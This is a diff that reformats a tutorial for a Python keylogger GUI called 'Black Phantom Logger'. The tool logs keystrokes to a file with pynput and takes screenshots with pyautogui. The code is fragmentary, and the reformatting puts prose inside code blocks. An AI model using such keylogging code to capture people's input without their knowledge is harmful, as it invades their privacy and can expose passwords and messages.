@@ -74,16 +74,18 @@ root = tk.Tk()
 root.title("Black Phantom Logger")
 root.geometry("400x400")
 root.configure(bg="black")
-tk.Tk() – Initializes the main window.
+`tk.Tk()` – Initializes the main window.
 
-title("Black Phantom Logger") – Sets the program title.
+`title("Black Phantom Logger")` – Sets the program title.
 
-geometry("400x400") – Defines the window size.
+`geometry("400x400")`– Defines the window size.
 
-configure(bg="black") – Applies the dark hacker-style theme.```
+`configure(bg="black")` – Applies the dark hacker-style theme.
+```
 
 3️⃣ Adding a Hacker-Style Logo
 
+```python
 logo = Image.open("hacker_logo.png")  # Make sure you have an image named hacker_logo.png
 logo = logo.resize((100, 100))
 logo = ImageTk.PhotoImage(logo)
@@ -92,9 +94,10 @@ logo_label.pack()
 Loads a hacker-themed image to enhance the look.
 
 Resizes the image and places it in the GUI.
+```
 
 4️⃣ Keystroke Logging Function
-
+ ```python
 def log_keystrokes(key):
     key = str(key).replace("'", "")
     with open("keystrokes.txt", "a") as file:
@@ -102,9 +105,11 @@ def log_keystrokes(key):
 Converts each pressed key into a string.
 
 Saves the keystrokes into a text file (keystrokes.txt).
+```
 
 5️⃣ Screenshot Capture Function
 
+```python
 def capture_screen():
     screenshot = pyautogui.screenshot()
     screenshot.save("screenshot.png")
@@ -114,9 +119,11 @@ Uses pyautogui.screenshot() to take a snapshot.
 Saves the image as "screenshot.png".
 
 Displays a confirmation message.
+```
 
 6️⃣ Start & Stop Buttons
 
+```python
 def start_logger():
     global listener
     listener = Listener(on_press=log_keystrokes)
@@ -130,9 +137,11 @@ def stop_logger():
 start_logger() – Begins keylogging in the background.
 
 stop_logger() – Stops the keylogger when needed.
+```
 
 7️⃣ Adding Buttons to GUI
 
+```python
 start_button = tk.Button(root, text="Start Logging", command=start_logger, bg="green", fg="white")
 stop_button = tk.Button(root, text="Stop Logging", command=stop_logger, bg="red", fg="white")
 screenshot_button = tk.Button(root, text="Capture Screen", command=capture_screen, bg="blue", fg="white")
@@ -147,12 +156,13 @@ Start Logging (Green Button)
 Stop Logging (Red Button)
 
 Capture Screen (Blue Button)
-
+```
 8️⃣ Running the GUI
 
+ ```python
 root.mainloop()
 root.mainloop() keeps the window running.
-
+```
 ### 🎭 Features & Hacker Simulation Experience
 Dark Theme: A black & green color scheme for a hacker-like feel.
 
